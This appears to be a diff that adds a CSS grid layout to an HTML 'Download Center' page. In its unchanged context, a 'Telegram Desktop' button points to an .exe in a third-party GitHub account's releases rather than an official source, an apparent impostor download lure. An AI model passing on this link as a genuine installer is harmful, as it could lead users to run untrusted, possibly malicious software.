@@ -6,11 +6,21 @@
   <style>
     body { font-family: Arial, sans-serif; margin: 40px; }
     h1 { color: #333; }
+
+    .wrap{
+        display: grid;
+        grid-template-columns: auto auto ;
+        padding: 20px;
+        margin: 20px;
+        gap: 20px;
+    }
     .software {
       margin-bottom: 20px;
       padding: 15px;
       border: 1px solid #ddd;
       border-radius: 8px;
+      
+
     }
     .software h2 { margin: 0; }
     .download-btn {
@@ -29,7 +39,7 @@
 </head>
 <body>
   <h1>Download Center</h1>
-
+<div class="wrap">
   <div class="software">
     <h2>Telegram Desktop</h2>
     <a class="download-btn" href="https://github.com/botcha354-bot/tgdl/releases/download/v1.2.0.kak/tsetup-x64.6.1.3.exe">
@@ -65,6 +75,7 @@
       Download
     </a>
     <p class="checksum">SHA256: <code>9FA7306D5E91969C2CACA30B675C7DC6AFF46AA626EE90F4E556652389D9FFD9</code></p>
+  </div>
   </div>
 </body>
 </html>
